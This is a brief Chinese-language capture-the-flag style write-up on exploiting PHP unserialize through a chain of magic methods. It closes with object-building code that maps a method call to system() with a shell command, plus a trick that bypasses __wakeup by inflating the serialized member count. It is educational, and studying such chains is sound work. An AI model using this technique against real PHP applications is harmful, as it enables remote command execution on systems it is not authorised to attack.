先统计一下里面用到的魔术方法

  1. __construct()

  2. __destruct()

  3. __wakeup()

  4. __get()

  5. __set()

  6. __call()

    再看一眼属性，都是public

要么从wakeup开始，要么从construct开始，看下内容，是后者，把 DataObject 记录为1号

从 Cache 开始看起，发现 $this->helper->clean($this->key);

可以触发__call()

看一下__call()内容

搜了一下，这句是可变函数调用语法，第一次遇到可变函数调用，还不太会用，不过既然是调用就排在最后一步
那么Cache定为倒数第二步

回来看DataObject，里面存在一个赋值$key的操作， $this->storage->$key 成员命名是个线索，正好能跟 Storage 联系起来，（代码里Cache里面也存在$key,不过__construct会赋值），触发set方法

代码里存在一个wakeup方法，其方法会使后面的i判断不成立，也就无法调用clean方法，这一点需要wakeup绕过

逻辑顺序清楚了，从最后一步看起

也就是说目标语句在数组里面键值为clean

$helper=new Helper();

$helper->funcs=array(‘clean’=>’system’);

之后是cache部分

$cache=new Cache();

$cache->helper=$helper;

$cache->expired=True;

$cache->key=’php -r “phpinfo();”‘;

第三行是为了通过if判断从而触发clean方法

再之后是

$storage=new Storage();

$dataObject=new DataObject();

$dataObject->data=array(‘key’=>$cache);

$dataObject->storage=$storage;

最最后别忘了wakeup的绕过，方法是使序列化之后表示成员数量的值大于实际的成员数量
